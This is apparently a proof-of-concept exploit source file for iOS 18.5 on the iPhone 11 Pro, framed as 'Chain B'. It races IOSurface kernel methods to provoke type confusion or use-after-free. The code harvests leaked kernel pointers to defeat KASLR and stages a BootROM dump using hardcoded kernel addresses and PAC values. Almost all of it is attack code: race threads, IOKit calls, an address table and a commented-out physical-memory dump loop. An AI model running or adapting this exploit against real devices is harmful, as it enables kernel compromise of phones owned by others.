/*
 * iOS 18.5 (22F76) — Chain B PoC: IOSurface Race → Kernel R/W → BootROM Dump
 * Target: iPhone 11 Pro (iPhone12,3) / A13 Bionic (T8030)
 * 
 * CORRECTED Phase 10 Analysis:
 *   - s_set_value IS LOCKED (BL-based lock at 0xa651770)
 *   - s_get_value has NO LOCK — 6 vtable dispatches unprotected
 *   - Attack: race locked setter vs unlocked getter = type confusion
 *
 * Phase 11 Kernel Primitives:
 *   - ml_phys_read_core:  0xfffffff00807b4f8 (452 bytes)
 *   - ml_phys_read_data:  0xfffffff00807b738 (wrapper, w1=4)
 *   - ml_phys_write_core: 0xfffffff00807b7a8 (444 bytes)
 *   - gPhysBase:          0xfffffff007a6cbb8
 *   - gPhysSize:          0xfffffff007a6cbc0
 *   - pv_head_table:      0xfffffff007a46d28
 *   - physmap_base const: 0xfffffffbffd00000
 *
 * Build: clang -framework IOKit -framework CoreFoundation -o chain_b chain_b_ios185_v2.m
 */

#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <pthread.h>
#import <mach/mach.h>
#import <IOKit/IOKitLib.h>

// ═══════════════════════════════════════════════════════════════════
// iOS 18.5 Kernel Addresses (pre-KASLR)
// ═══════════════════════════════════════════════════════════════════

#define KC_BASE                 0xfffffff007004000ULL

// IOSurface dispatch table (63 entries, 24-byte stride)
#define DISPATCH_TABLE_VA       0xfffffff007e56618ULL

// IOSurface kext __TEXT_EXEC
#define IOSURFACE_TEXT_START    0xfffffff009e676d0ULL
#define IOSURFACE_TEXT_END      0xfffffff009e954c8ULL

// Key dispatch handlers
#define S_CREATE_SURFACE        0xfffffff009e86024ULL  // sel 0 [NO LOCK]
#define S_DELETE_SURFACE        0xfffffff0084ff664ULL  // sel 1
#define S_LOOKUP_SURFACE        0xfffffff0084ff418ULL  // sel 2
#define S_LOCK_SURFACE          0xfffffff0084ff390ULL  // sel 3
#define S_UNLOCK_SURFACE        0xfffffff0085630e8ULL  // sel 4 [NO LOCK]
#define S_GET_VALUE             0xfffffff00857f3a4ULL  // sel 5 [NO LOCK !!]
#define S_SET_VALUE             0xfffffff00857ee7cULL  // sel 6 [LOCKED via BL]
#define S_INCREMENT_USE         0xfffffff00861c8d0ULL  // sel 7 [NO LOCK]
#define S_DECREMENT_USE         0xfffffff00857e464ULL  // sel 8 [NO LOCK]
#define S_SET_VALUE_XML         0xfffffff00857e1acULL  // sel 9 [NO LOCK]
#define S_GET_VALUE_XML         0xfffffff00857dde8ULL  // sel 10 [NO LOCK]
#define S_BULK_SET_VALUE        0xfffffff00857dba0ULL  // sel 11 [NO LOCK]
#define S_BULK_GET_VALUE        0xfffffff00857d83cULL  // sel 12 [NO LOCK]

// Lock function pair (generic kernel lock)
#define LOCK_ACQUIRE_FUNC       0xfffffff007f4bc20ULL
#define LOCK_RELEASE_FUNC       0xfffffff007f4c894ULL
#define IOSURFACE_GLOBAL_LOCK   0xfffffff00a651770ULL  // the lock s_set_value uses

// IOSurface vtable
#define VTABLE_VA               0xfffffff007e56618ULL  // 777 PAC-IA signed entries

// PAC Diversities (DA key for vtable auth)
#define PAC_VTABLE_AUTH         0xcda1  // AUTDA diversity for vtable pointer
#define PAC_RETAIN              0x2e4a  // vtable+0x20 (IA key)
#define PAC_RELEASE             0x3a87  // vtable+0x28 (IA key)

// s_set_value vtable dispatches (LOCKED)
#define PAC_SET_CONTAINER       0x5837  // vtable+0x128 (property container lookup)
#define PAC_SET_PROPERTY        0x8453  // vtable+0x118 (property setter)

// s_get_value vtable dispatches (UNLOCKED!)
#define PAC_GET_PROPERTY        0x5a20  // vtable+0x148 (property getter)
#define PAC_GET_HELPER          0x4a6a  // vtable+0x68 (helper)
#define PAC_GET_ALLOC           0x1ac8  // allocation helper

// s_set_value_xml vtable dispatches (UNLOCKED!)
#define PAC_XML_HANDLER         0x4578  // DIFFERENT from PAC_SET_CONTAINER!
// This difference enables type confusion between binary and XML paths

// Kernel physical memory primitives
#define ML_PHYS_READ_CORE       0xfffffff00807b4f8ULL
#define ML_PHYS_READ_DATA       0xfffffff00807b738ULL  // read 4 bytes
#define ML_PHYS_READ_HALF       0xfffffff00807b754ULL  // read 2 bytes
#define ML_PHYS_READ_BYTE       0xfffffff00807b770ULL  // read 1 byte
#define ML_PHYS_READ_DOUBLE     0xfffffff00807b78cULL  // read 8 bytes
#define ML_PHYS_WRITE_CORE      0xfffffff00807b7a8ULL

// Global variables
#define G_PHYS_BASE             0xfffffff007a6cbb8ULL   // physical memory base
#define G_PHYS_SIZE             0xfffffff007a6cbc0ULL   // physical memory size
#define PV_HEAD_TABLE           0xfffffff007a46d28ULL   // page-to-virtual table
#define PHYSMAP_BASE_CONST      0xfffffffbffd00000ULL   // physmap VA base

// BootROM target
#define T8030_BOOTROM_PHYS      0x100000000ULL          // A13 SecureROM physical
#define T8030_BOOTROM_SIZE      0x80000                 // 512 KB

// ═══════════════════════════════════════════════════════════════════
// Race Condition Fuzzer
// ═══════════════════════════════════════════════════════════════════

typedef struct {
    io_connect_t connection;
    uint32_t surface_id;
    volatile int running;
    volatile uint64_t race_count;
    volatile uint64_t crash_count;
    uint64_t kaslr_slide;
} race_ctx_t;

static race_ctx_t g_ctx = {0};

/*
 * ATTACK VECTOR: Lock asymmetry race
 * 
 * s_set_value flow (LOCKED):
 *   BL lock_acquire(0xa651770)     ← acquires global lock
 *   LDR x0, [self, #0x18]          ← load inner object (property container)
 *   vtable+0x128(x0, key)          ← lookup property (div 0x5837)
 *   vtable+0x118(result, 0)        ← set property (div 0x8453) 
 *   vtable+0x20(result)            ← retain (div 0x2e4a)
 *   BL lock_release(0xa651770)     ← releases lock
 *
 * s_get_value flow (UNLOCKED!):
 *   vtable+0x148(self, key)        ← NO LOCK → reads property (div 0x5a20)
 *   vtable+0x68(result)            ← helper dispatch (div 0x4a6a)
 *   vtable+0x20(result)            ← retain (div 0x2e4a)
 *   vtable+0x28(old)               ← release (div 0x3a87)
 *   ... (6 vtable dispatches total, ALL unlocked)
 *
 * RACE WINDOW: s_get_value reads the property container WITHOUT the lock.
 * If s_set_value is replacing a property at the same time, s_get_value
 * can read a partially-updated pointer → type confusion or UAF.
 */

// Set a property on an IOSurface (goes through LOCKED s_set_value)
kern_return_t set_surface_value(io_connect_t conn, uint32_t surface_id,
                                 uint32_t key, void *data, size_t len) {
    // IOSurfaceRootUserClient::s_set_value(surface_id, key, value_type, data, len)
    uint64_t input[4] = {surface_id, key, 0 /* type */, len};
    uint32_t input_cnt = 4;
    
    return IOConnectCallMethod(conn, 6, // selector 6 = s_set_value
                               input, input_cnt,
                               data, len,
                               NULL, NULL, NULL, NULL);
}

// Get a property value (goes through UNLOCKED s_get_value)
kern_return_t get_surface_value(io_connect_t conn, uint32_t surface_id,
                                 uint32_t key, void *out, size_t *out_len) {
    uint64_t input[2] = {surface_id, key};
    uint32_t input_cnt = 2;
    uint32_t out_cnt = 0;
    
    return IOConnectCallMethod(conn, 5, // selector 5 = s_get_value
                               input, input_cnt,
                               NULL, 0,
                               NULL, &out_cnt, out, out_len);
}

// Set property via XML path (UNLOCKED, different vtable dispatch diversity!)
kern_return_t set_surface_value_xml(io_connect_t conn, uint32_t surface_id,
                                     void *xml_data, size_t xml_len) {
    uint64_t input[1] = {surface_id};
    return IOConnectCallMethod(conn, 9, // selector 9 = s_set_value_xml
                               input, 1,
                               xml_data, xml_len,
                               NULL, NULL, NULL, NULL);
}

// ═══════════════════════════════════════════════════════════════════
// Thread A: Setter (locked path — alternates binary/XML set)
// ═══════════════════════════════════════════════════════════════════

void *setter_thread(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    
    // Prepare two different value types to alternate between
    uint8_t small_data[16] = {0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
                               0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42};
    
    // XML payload that creates a different object type (OSDictionary vs OSData)
    const char *xml_payload = 
        "<?xml version=\"1.0\"?>"
        "<dict>"
        "<key>IOSurfaceRaceKey</key>"
        "<dict>"
        "<key>A</key><integer>0x4141414141414141</integer>"
        "<key>B</key><data>QUFBQUFBQUFCQUJCQUJCQQ==</data>"
        "</dict>"
        "</dict>";
    size_t xml_len = strlen(xml_payload);
    
    while (ctx->running) {
        // Alternate between binary set (locked, vtable+0x128 div 0x5837)
        // and XML set (unlocked, vtable+??? div 0x4578)
        // The different vtable offsets mean they handle objects differently
        
        for (int i = 0; i < 100; i++) {
            set_surface_value(ctx->connection, ctx->surface_id,
                            0x1337, small_data, sizeof(small_data));
        }
        
        for (int i = 0; i < 100; i++) {
            set_surface_value_xml(ctx->connection, ctx->surface_id,
                                (void *)xml_payload, xml_len);
        }
        
        ctx->race_count += 200;
    }
    
    return NULL;
}

// ═══════════════════════════════════════════════════════════════════
// Thread B: Getter (unlocked path — reads during setter's modification)
// ═══════════════════════════════════════════════════════════════════

void *getter_thread(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    
    uint8_t output[4096];
    size_t out_len;
    
    while (ctx->running) {
        out_len = sizeof(output);
        kern_return_t kr = get_surface_value(ctx->connection, ctx->surface_id,
                                              0x1337, output, &out_len);
        
        if (kr == KERN_SUCCESS && out_len > 0) {
            // Check for signs of type confusion:
            // 1. Unexpected output length (dict read as data)
            // 2. Kernel pointers in output (vtable leak)
            // 3. out_len being very large (length field confusion)
            
            // Check for kernel pointer patterns (0xfffffff0...)
            for (size_t i = 0; i + 8 <= out_len; i += 8) {
                uint64_t val = *(uint64_t *)(output + i);
                if ((val >> 40) == 0xFFFFFF) {
                    // Possible kernel pointer leaked!
                    uint64_t possible_slide = 0;
                    if (val > KC_BASE && val < KC_BASE + 0x100000000ULL) {
                        possible_slide = val - KC_BASE;
                        // Align to page
                        possible_slide &= ~0xFFFULL;
                    }
                    
                    printf("[!] KERNEL POINTER LEAK @ out[%zu]: 0x%llx", i, val);
                    if (possible_slide) {
                        printf(" (possible slide: 0x%llx)", possible_slide);
                        ctx->kaslr_slide = possible_slide;
                    }
                    printf("\n");
                }
            }
            
            if (out_len > 256) {
                printf("[!] SUSPICIOUS output length: %zu (expected small)\n", out_len);
            }
        }
        
        ctx->race_count++;
    }
    
    return NULL;
}

// ═══════════════════════════════════════════════════════════════════
// Thread C: Use-count racer (decrement without lock → UAF)
// ═══════════════════════════════════════════════════════════════════

void *decrement_thread(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    
    while (ctx->running) {
        // s_decrement_use_count has NO LOCK
        // Racing this with get_value while refcount transitions → UAF
        uint64_t input[1] = {ctx->surface_id};
        IOConnectCallMethod(ctx->connection, 8, // sel 8 = s_decrement_use_count
                           input, 1, NULL, 0, NULL, NULL, NULL, NULL);
        
        // Re-increment to keep surface alive
        IOConnectCallMethod(ctx->connection, 7, // sel 7 = s_increment_use_count
                           input, 1, NULL, 0, NULL, NULL, NULL, NULL);
        
        ctx->race_count += 2;
    }
    
    return NULL;
}

// ═══════════════════════════════════════════════════════════════════
// IOSurface connection setup
// ═══════════════════════════════════════════════════════════════════

io_connect_t open_iosurface(void) {
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                            IOServiceMatching("IOSurfaceRoot"));
    if (!service) {
        printf("[-] IOSurfaceRoot not found\n");
        return 0;
    }
    
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    IOObjectRelease(service);
    
    if (kr != KERN_SUCCESS) {
        printf("[-] IOServiceOpen failed: 0x%x\n", kr);
        return 0;
    }
    
    return conn;
}

uint32_t create_surface(io_connect_t conn) {
    // Create a minimal IOSurface
    // Properties: width=32, height=32, bytesPerElement=4, format=BGRA
    const char *props_xml = 
        "<?xml version=\"1.0\"?>"
        "<dict>"
        "<key>IOSurfaceWidth</key><integer>32</integer>"
        "<key>IOSurfaceHeight</key><integer>32</integer>"
        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
        "<key>IOSurfaceAllocSize</key><integer>4096</integer>"
        "</dict>";
    
    uint64_t output[1] = {0};
    uint32_t output_cnt = 1;
    
    kern_return_t kr = IOConnectCallMethod(conn, 0, // sel 0 = s_create_surface
                                            NULL, 0,
                                            (void *)props_xml, strlen(props_xml),
                                            output, &output_cnt,
                                            NULL, NULL);
    
    if (kr != KERN_SUCCESS) {
        printf("[-] create_surface failed: 0x%x\n", kr);
        return 0;
    }
    
    return (uint32_t)output[0];
}

// ═══════════════════════════════════════════════════════════════════
// Phase D: BootROM dump (after kernel R/W achieved)
// ═══════════════════════════════════════════════════════════════════

typedef uint32_t (*ml_phys_read_data_t)(uint64_t paddr);

void dump_bootrom(uint64_t slide) {
    printf("[*] BootROM dump — A13 (T8030) SecureROM @ phys 0x%llx\n", T8030_BOOTROM_PHYS);
    printf("[*] KASLR slide: 0x%llx\n", slide);
    
    uint64_t ml_phys_read_addr = ML_PHYS_READ_DATA + slide;
    uint64_t gPhysBase_addr = G_PHYS_BASE + slide;
    uint64_t gPhysSize_addr = G_PHYS_SIZE + slide;
    
    printf("[*] ml_phys_read_data @ 0x%llx\n", ml_phys_read_addr);
    printf("[*] gPhysBase @ 0x%llx\n", gPhysBase_addr);
    printf("[*] gPhysSize @ 0x%llx\n", gPhysSize_addr);
    
    // TODO: After building kernel execute primitive:
    //   1. Read gPhysBase → verify physical memory range
    //   2. Call ml_phys_read_data(0x100000000) in loop for 512KB
    //   3. Or use physmap approach: read from physmap_base + offset
    //
    // Alternative via kernel virtual R/W only:
    //   1. Walk page tables to find physmap mapping
    //   2. Read 512KB from physmap_va + 0x100000000
    
    printf("[*] BootROM dump requires kernel execute or physmap R/W primitive\n");
    printf("[*] Use IOSurface type confusion → fake vtable → arbitrary call\n");
    
    /*
    // With kernel execute:
    ml_phys_read_data_t phys_read = (ml_phys_read_data_t)ml_phys_read_addr;
    
    FILE *f = fopen("t8030_bootrom.bin", "wb");
    for (uint64_t off = 0; off < T8030_BOOTROM_SIZE; off += 4) {
        uint32_t val = phys_read(T8030_BOOTROM_PHYS + off);
        fwrite(&val, 4, 1, f);
        if ((off & 0xFFFF) == 0) printf("\r[*] Dumping... 0x%llx / 0x%x", off, T8030_BOOTROM_SIZE);
    }
    fclose(f);
    printf("\n[+] BootROM dumped to t8030_bootrom.bin (%u bytes)\n", T8030_BOOTROM_SIZE);
    */
}

// ═══════════════════════════════════════════════════════════════════
// Main: Race orchestrator
// ═══════════════════════════════════════════════════════════════════

int main(int argc, char **argv) {
    printf("═══════════════════════════════════════════════════════════════\n");
    printf(" iOS 18.5 (22F76) Chain B — IOSurface Lock Asymmetry Race\n");
    printf(" Target: iPhone 11 Pro / A13 / T8030\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");
    
    printf("[*] Attack: s_set_value (LOCKED) vs s_get_value (UNLOCKED)\n");
    printf("[*] The setter holds lock at 0x%llx, getter doesn't\n\n", IOSURFACE_GLOBAL_LOCK);
    
    // Step 1: Open IOSurface connection
    io_connect_t conn = open_iosurface();
    if (!conn) return 1;
    printf("[+] IOSurface connection: 0x%x\n", conn);
    
    // Step 2: Create target surface
    uint32_t surface_id = create_surface(conn);
    if (!surface_id) return 1;
    printf("[+] Target surface ID: %u\n", surface_id);
    
    // Step 3: Set initial property value
    uint8_t init_data[64];
    memset(init_data, 0x43, sizeof(init_data));
    kern_return_t kr = set_surface_value(conn, surface_id, 0x1337, 
                                          init_data, sizeof(init_data));
    if (kr != KERN_SUCCESS) {
        printf("[-] Initial set_value failed: 0x%x\n", kr);
    } else {
        printf("[+] Initial property set (key=0x1337, 64 bytes)\n");
    }
    
    // Step 4: Initialize race context
    g_ctx.connection = conn;
    g_ctx.surface_id = surface_id;
    g_ctx.running = 1;
    g_ctx.race_count = 0;
    g_ctx.kaslr_slide = 0;
    
    // Step 5: Launch race threads
    printf("\n[*] Launching race threads...\n");
    printf("[*] Thread A: setter (locked path, alternating binary/XML)\n");
    printf("[*] Thread B: getter (UNLOCKED path — 6 vtable dispatches)\n");
    printf("[*] Thread C: decrement racer (UAF vector)\n\n");
    
    pthread_t setter_tid, getter_tid1, getter_tid2, decrement_tid;
    
    pthread_create(&setter_tid, NULL, setter_thread, &g_ctx);
    pthread_create(&getter_tid1, NULL, getter_thread, &g_ctx);
    pthread_create(&getter_tid2, NULL, getter_thread, &g_ctx);
    // Uncomment for UAF vector (more dangerous):
    // pthread_create(&decrement_tid, NULL, decrement_thread, &g_ctx);
    
    // Step 6: Monitor race
    for (int i = 0; i < 60; i++) {  // Run for 60 seconds
        sleep(1);
        printf("\r[*] Racing... %llu ops", g_ctx.race_count);
        fflush(stdout);
        
        if (g_ctx.kaslr_slide != 0) {
            printf("\n\n[!!!] KASLR SLIDE FOUND: 0x%llx\n", g_ctx.kaslr_slide);
            g_ctx.running = 0;
            break;
        }
    }
    
    g_ctx.running = 0;
    printf("\n[*] Stopping...\n");
    
    pthread_join(setter_tid, NULL);
    pthread_join(getter_tid1, NULL);
    pthread_join(getter_tid2, NULL);
    
    printf("[*] Total race operations: %llu\n", g_ctx.race_count);
    
    if (g_ctx.kaslr_slide) {
        printf("\n[+] KASLR slide: 0x%llx\n", g_ctx.kaslr_slide);
        printf("[*] Resolved addresses:\n");
        printf("    ml_phys_read_data: 0x%llx\n", ML_PHYS_READ_DATA + g_ctx.kaslr_slide);
        printf("    ml_phys_write_core: 0x%llx\n", ML_PHYS_WRITE_CORE + g_ctx.kaslr_slide);
        printf("    gPhysBase:          0x%llx\n", G_PHYS_BASE + g_ctx.kaslr_slide);
        printf("    pv_head_table:      0x%llx\n", PV_HEAD_TABLE + g_ctx.kaslr_slide);
        
        dump_bootrom(g_ctx.kaslr_slide);
    } else {
        printf("\n[-] No KASLR slide found in this run. Retry or adjust timing.\n");
    }
    
    IOServiceClose(conn);
    return 0;
}
